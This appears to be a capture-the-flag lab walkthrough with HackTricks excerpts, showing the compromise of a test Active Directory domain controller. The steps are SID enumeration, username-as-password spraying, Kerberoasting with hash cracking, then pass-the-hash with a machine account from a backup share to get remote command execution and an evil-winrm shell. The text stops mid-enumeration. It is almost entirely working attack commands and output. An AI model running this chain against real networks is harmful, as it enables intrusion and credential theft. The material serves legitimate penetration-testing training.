![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

<🔄 Alternative Step>

`impacket-lookupsid -no-pass 'SOUPEDECODE.LOCAL/anonymous@192.168.56.128'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 192.168.56.128
[*] StringBinding ncacn_np:192.168.56.128[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
512: SOUPEDECODE\Domain Admins (SidTypeGroup)
513: SOUPEDECODE\Domain Users (SidTypeGroup)
514: SOUPEDECODE\Domain Guests (SidTypeGroup)
515: SOUPEDECODE\Domain Computers (SidTypeGroup)
516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
518: SOUPEDECODE\Schema Admins (SidTypeGroup)
519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
525: SOUPEDECODE\Protected Users (SidTypeGroup)
526: SOUPEDECODE\Key Admins (SidTypeGroup)
527: SOUPEDECODE\Enterprise Key Admins (SidTypeGroup)
553: SOUPEDECODE\RAS and IAS Servers (SidTypeAlias)
571: SOUPEDECODE\Allowed RODC Password Replication Group (SidTypeAlias)
572: SOUPEDECODE\Denied RODC Password Replication Group (SidTypeAlias)
1000: SOUPEDECODE\DC01$ (SidTypeUser)
1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
1103: SOUPEDECODE\bmark0 (SidTypeUser)
1104: SOUPEDECODE\otara1 (SidTypeUser)
1105: SOUPEDECODE\kleo2 (SidTypeUser)
1106: SOUPEDECODE\eyara3 (SidTypeUser)
1107: SOUPEDECODE\pquinn4 (SidTypeUser)
1108: SOUPEDECODE\jharper5 (SidTypeUser)
1109: SOUPEDECODE\bxenia6 (SidTypeUser)

[...]
```

</🔄 Alternative Step>

`impacket-lookupsid -no-pass 'SOUPEDECODE.LOCAL/anonymous@192.168.56.128' > ./out.txt`

`cat ./out.txt | grep -e "SidTypeUser" > ./out2.txt`

`cat ./out2.txt | awk '{print $2}' > ./out3.txt`

`cat ./out3.txt | cut -d '\' -f2 | cut -d ' ' -f1 | tee ./domain_users.txt`:
```
Administrator
Guest
krbtgt
DC01$
bmark0
otara1
kleo2
eyara3
pquinn4
jharper5
bxenia6
gmona7
oaaron8
pleo9
evictor10

[...]
```

<❌ Failed Step>

`hydra -L ./domain_users.txt -e s -F -V smb://192.168.56.128`:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-21 15:09:53
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1069 login tries (l:1069/p:1), ~1069 tries per task
[DATA] attacking smb://192.168.56.128:445/
[ERROR] invalid reply from target smb://192.168.56.128:445/ ←
```

</❌ Failed Step>

`crackmapexec smb 192.168.56.128 -u ./domain_users.txt -p ./domain_users.txt --no-bruteforce`:
```
SMB         192.168.56.128  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False) ←
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\Guest:Guest STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:krbtgt STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\DC01$:DC01$ STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\otara1:otara1 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\eyara3:eyara3 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\pquinn4:pquinn4 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\jharper5:jharper5 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\bxenia6:bxenia6 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\gmona7:gmona7 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\oaaron8:oaaron8 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\pleo9:pleo9 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\evictor10:evictor10 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\bgavin12:bgavin12 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\ndelia13:ndelia13 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\akevin14:akevin14 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\kxenia15:kxenia15 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\ycody16:ycody16 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\qnora17:qnora17 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\dyvonne18:dyvonne18 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\qxenia19:qxenia19 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\rreed20:rreed20 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 ←
```

`crackmapexec smb 192.168.56.128 -u 'ybob317' -p 'ybob317' --shares`:
```
SMB         192.168.56.128  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         192.168.56.128  445    DC01             [*] Enumerated shares
SMB         192.168.56.128  445    DC01             Share           Permissions     Remark
SMB         192.168.56.128  445    DC01             -----           -----------     ------
SMB         192.168.56.128  445    DC01             ADMIN$                          Remote Admin
SMB         192.168.56.128  445    DC01             backup                          
SMB         192.168.56.128  445    DC01             C$                              Default share
SMB         192.168.56.128  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.128  445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.56.128  445    DC01             SYSVOL          READ            Logon server share 
SMB         192.168.56.128  445    DC01             Users           READ ←
```

`smbclient -U 'ybob317' --password 'ybob317' //192.168.56.128/Users`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu Jul  4 18:48:22 2024
  ..                                DHS        0  Mon Jun 17 13:42:50 2024
  admin                               D        0  Thu Jul  4 18:49:01 2024
  Administrator                       D        0  Sat Jun 15 15:56:40 2024
  All Users                       DHSrn        0  Sat May  8 04:26:16 2021
  Default                           DHR        0  Sat Jun 15 22:51:08 2024
  Default User                    DHSrn        0  Sat May  8 04:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 04:14:03 2021
  Public                             DR        0  Sat Jun 15 13:54:32 2024
  ybob317                             D        0  Mon Jun 17 13:24:32 2024 ←

                12942591 blocks of size 4096. 10958582 blocks available
smb: \> cd ybob317
smb: \ybob317\> dir
  .                                   D        0  Mon Jun 17 13:24:32 2024
  ..                                 DR        0  Thu Jul  4 18:48:22 2024
  Desktop                            DR        0  Mon Jun 17 13:45:32 2024 ←
  Documents                          DR        0  Mon Jun 17 13:24:32 2024
  Downloads                          DR        0  Mon Jun 17 13:24:32 2024
  NTUSER.DAT                        AHn   262144  Mon Sep  2 17:39:01 2024
  ntuser.dat.LOG1                   AHS    81920  Mon Jun 17 13:24:29 2024
  ntuser.dat.LOG2                   AHS        0  Mon Jun 17 13:24:29 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TM.blf    AHS    65536  Mon Jun 17 13:24:54 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Mon Jun 17 13:24:29 2024
  NTUSER.DAT{3e6aec0f-2b8b-11ef-bb89-080027df5733}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Mon Jun 17 13:24:29 2024

                12942591 blocks of size 4096. 10958582 blocks available
smb: \ybob317\> cd Desktop\
smb: \ybob317\Desktop\> dir
  .                                  DR        0  Mon Jun 17 13:45:32 2024
  ..                                  D        0  Mon Jun 17 13:24:32 2024
  desktop.ini                       AHS      282  Mon Jun 17 13:24:32 2024
  user.txt                            A       32  Wed Jun 12 07:54:32 2024 ←

                12942591 blocks of size 4096. 10958582 blocks available
smb: \ybob317\Desktop\> get user.txt 
getting file \ybob317\Desktop\user.txt of size 32 as user.txt (7.8 KiloBytes/sec) (average 7.8 KiloBytes/sec) ←
smb: \ybob317\Desktop\> exit
```

`cat ./user.txt`:
``` 
6bab1*************************** ←
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)

[**#Enumerating Active Directory WITH credentials/session**]

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration.**

Regarding [**ASREPRoast**](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast) you can now find every possible vulnerable user, and regarding [**Password Spraying**](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.
- You could use the [**CMD to perform a basic recon**](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#domain-info)
- You can also use [**powershell for recon**](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters) which will be stealthier
- You ca also [**use powerview**](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
    - **Other automated AD enumeration tools are:** [**AD Explorer**](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound#ad-explorer)**,** [**ADRecon**](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound#adrecon)**,** [**Group3r**](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound#group3r)**,** [**PingCastle**](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound#pingcastle)**.**
- [**DNS records of the AD**](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-dns-records) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
    - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
    - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**
    It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`impacket-GetADUsers -all -dc-ip 192.168.56.128 'SOUPEDECODE.LOCAL/ybob317:ybob317'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Querying 192.168.56.128 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2024-07-04 18:38:33.872408  2024-07-04 18:39:31.515256 
Guest                                                 2024-06-17 13:11:34.147233  2024-09-02 20:58:25.886049 
krbtgt                                                2024-06-15 15:25:27.523044  <never>             
bmark0                bmark0@soupedecode.local        2024-06-15 16:04:35.007382  <never>             
otara1                otara1@soupedecode.local        2024-06-15 16:04:35.106437  <never>             
kleo2                 kleo2@soupedecode.local         2024-06-15 16:04:35.158848  <never>             
eyara3                eyara3@soupedecode.local        2024-06-15 16:04:35.215641  <never>             
pquinn4               pquinn4@soupedecode.local       2024-06-15 16:04:35.266102  <never>             
jharper5              jharper5@soupedecode.local      2024-06-15 16:04:35.358157  <never>             
bxenia6               bxenia6@soupedecode.local       2024-06-15 16:04:35.419282  <never>             
gmona7                gmona7@soupedecode.local        2024-06-15 16:04:35.469474  <never>             
oaaron8               oaaron8@soupedecode.local       2024-06-15 16:04:35.518652  <never>             
pleo9                 pleo9@soupedecode.local         2024-06-15 16:04:35.576893  <never>

[...]
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Kerberoast](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)

[**#Attack**]

**Linux**:
```sh
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password:
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

<❌ Failed Step>

`impacket-GetUserSPNs -dc-ip 192.168.56.128 'SOUPEDECODE.LOCAL/ybob317:ybob317'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 13:32:23.726085  <never> ←              
FW/ProxyServer          firewall_svc              2024-06-17 13:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never>   
```

`impacket-GetUserSPNs -dc-ip 192.168.56.128 'SOUPEDECODE.LOCAL/ybob317:ybob317' -request`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 13:32:23.726085  <never> ←              
FW/ProxyServer          firewall_svc              2024-06-17 13:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never>               



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) ←
```

</❌ Failed Step>

`ntpdate 192.168.56.128`:
```
2024-09-03 13:42:46.770792 (-0400) +32399.550622 +/- 0.000754 192.168.56.128 s1 no-leap
CLOCK: time stepped by 32399.550622
```

`impacket-GetUserSPNs -dc-ip 192.168.56.128 'SOUPEDECODE.LOCAL/ybob317:ybob317' -request`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 13:32:23.726085  <never> ←              
FW/ProxyServer          firewall_svc              2024-06-17 13:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never>               


[-] CCache file is not found. Skipping...
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$9da2eb1ac6753a95a87d415564754be4$ecccdc63caf4d533e4a6ece38cb77f7a2f8b27d4d28ef5c72381ac4389c2e846f69e6ea26dc96f1e5c4f41f65dcc30f7e987a2d4681feca30771c4e4569860c09fe92bfab6390100aabc

[...]

6b834422e8dba72c27dd7f52fd1503b49735719a9c1a6fda9e8ae5b21eb1845deb44ed5701e34117c81e92689a883e2900c2809f4e0583b399e614d6f3b060beee913b5c29b13ca1cedbfefe2a10d72b479ac633f5032d200944453d62bb3896e0e2e7107902b8d5e5dc06496297012 ←

$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/firewall_svc*$83616750598e8e212f94bf82d5dca6a7$e24de15d6e335b0ec777de53dc35faf68553cbf51b09b4db85ee049ff26037dc4bef18aef23ce1c2debef610224e913d604fe1945d5940b9927f7bae66dd85865e18d71c5e9d

[...]
```

`vim ./fileserver_tgs.txt`:
```
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$9da2eb1ac6753a95a87d415564754be4$ecccdc63caf4d533e4a6ece38cb77f7a2f8b27d4d28ef5c72381ac4389c2e846f69e6ea26dc96f1e5c4f41f65dcc30f7e987a2d4681feca30771c4e4569860c09fe92bfab6390100aabc

[...]

6b834422e8dba72c27dd7f52fd1503b49735719a9c1a6fda9e8ae5b21eb1845deb44ed5701e34117c81e92689a883e2900c2809f4e0583b399e614d6f3b060beee913b5c29b13ca1cedbfefe2a10d72b479ac633f5032d200944453d62bb3896e0e2e7107902b8d5e5dc06496297012 ←
```

`john --wordlist=/usr/share/wordlists/rockyou.txt ./fileserver_tgs.txt`:
```
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123!!    (?) ← 
1g 0:00:00:12 DONE (2024-09-03 04:47) 0.07757g/s 832585p/s 832585c/s 832585C/s Passwordas..Partygurl
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`crackmapexec smb 192.168.56.128 -u 'file_svc' -p 'Password123!!' --shares`:
```
SMB         192.168.56.128  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Password123!! 
SMB         192.168.56.128  445    DC01             [*] Enumerated shares
SMB         192.168.56.128  445    DC01             Share           Permissions     Remark
SMB         192.168.56.128  445    DC01             -----           -----------     ------
SMB         192.168.56.128  445    DC01             ADMIN$                          Remote Admin
SMB         192.168.56.128  445    DC01             backup          READ ←           
SMB         192.168.56.128  445    DC01             C$                              Default share
SMB         192.168.56.128  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.128  445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.56.128  445    DC01             SYSVOL          READ            Logon server share 
SMB         192.168.56.128  445    DC01             Users
```

`smbclient -U 'file_svc' --password 'Password123!!' //192.168.56.128/backup`:
``` 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jun 17 13:41:17 2024
  ..                                 DR        0  Mon Jun 17 13:44:56 2024
  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024 ←

                12942591 blocks of size 4096. 10955414 blocks available
smb: \> get backup_extract.txt ←
getting file \backup_extract.txt of size 892 as backup_extract.txt (23.5 KiloBytes/sec) (average 23.5 KiloBytes/sec)
smb: \> exit
```

`cat ./backup_extract.txt`:
```
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559::: ←
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

`crackmapexec smb 192.168.56.128 -u 'FileServer$' -H 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559' --shares`:
```
SMB         192.168.56.128  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         192.168.56.128  445    DC01             [*] Enumerated shares
SMB         192.168.56.128  445    DC01             Share           Permissions     Remark
SMB         192.168.56.128  445    DC01             -----           -----------     ------
SMB         192.168.56.128  445    DC01             ADMIN$          READ,WRITE ←     Remote Admin
SMB         192.168.56.128  445    DC01             backup                          
SMB         192.168.56.128  445    DC01             C$              READ,WRITE ←     Default share
SMB         192.168.56.128  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.128  445    DC01             NETLOGON        READ,WRITE      Logon server share 
SMB         192.168.56.128  445    DC01             SYSVOL          READ            Logon server share 
SMB         192.168.56.128  445    DC01             Users
```

`crackmapexec smb 192.168.56.128 -u 'FileServer$' -H 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559' -x "whoami"`:
```
SMB         192.168.56.128  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         192.168.56.128  445    DC01             [+] Executed command via wmiexec ←
SMB         192.168.56.128  445    DC01             soupedecode\fileserver$ ←
```

<❌ Failed Step>

`impacket-psexec 'FileServer$@192.168.56.128' -hashes 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.56.128.....
[*] Found writable share ADMIN$ ←
[*] Uploading file IKFHISBg.exe
[*] Opening SVCManager on 192.168.56.128.....
[*] Creating service zalu on 192.168.56.128.....
[*] Starting service zalu.....
[*] Opening SVCManager on 192.168.56.128.....
[-] Error performing the uninstallation, cleaning up ←
```

</❌ Failed Step>

`crackmapexec smb 192.168.56.128 -u 'FileServer$' -H 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559' -X 'powershell -Command "Get-ADComputer -Identity ''FileServer$'' -Properties *"'`:
```
SMB         192.168.56.128  445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.128  445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         192.168.56.128  445    DC01             [+] Executed command via wmiexec
SMB         192.168.56.128  445    DC01             Invoke-Expression : At line:1 char:1
SMB         192.168.56.128  445    DC01             + [Net.ServicePointManager]::ServerCertificateValidationCallback = {$tr ...
SMB         192.168.56.128  445    DC01             + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SMB         192.168.56.128  445    DC01             This script contains malicious content and has been blocked by your antivirus software. ←
SMB         192.168.56.128  445    DC01             At line:1 char:1
SMB         192.168.56.128  445    DC01             + .( $eNv:pubLiC[13]+$Env:Public[5]+'X') ([StRinG]::jOIN('' , ('91i78>1 ...
SMB         192.168.56.128  445    DC01             + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SMB         192.168.56.128  445    DC01             + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
SMB         192.168.56.128  445    DC01             + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[5985,5986 - Pentesting WinRM](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm)

[**#Using evil-winrm**]

Read **documentation** on its github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```

To use evil-winrm to connect to an **IPv6 address** create an entry inside _**/etc/hosts**_ setting a **domain name** to the IPv6 address and connect to that domain.

Pass the hash with evil-winrm:
```
evil-winrm -u <username> -H <Hash> -i <IP>
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`evil-winrm -i 192.168.56.128 -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'`:
```
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint ←
*Evil-WinRM* PS C:\Users\FileServer$\Documents> 
```

![Victim: fileserver](https://custom-icon-badges.demolab.com/badge/Victim-fileserver-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
soupedecode\fileserver$ ←
```

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
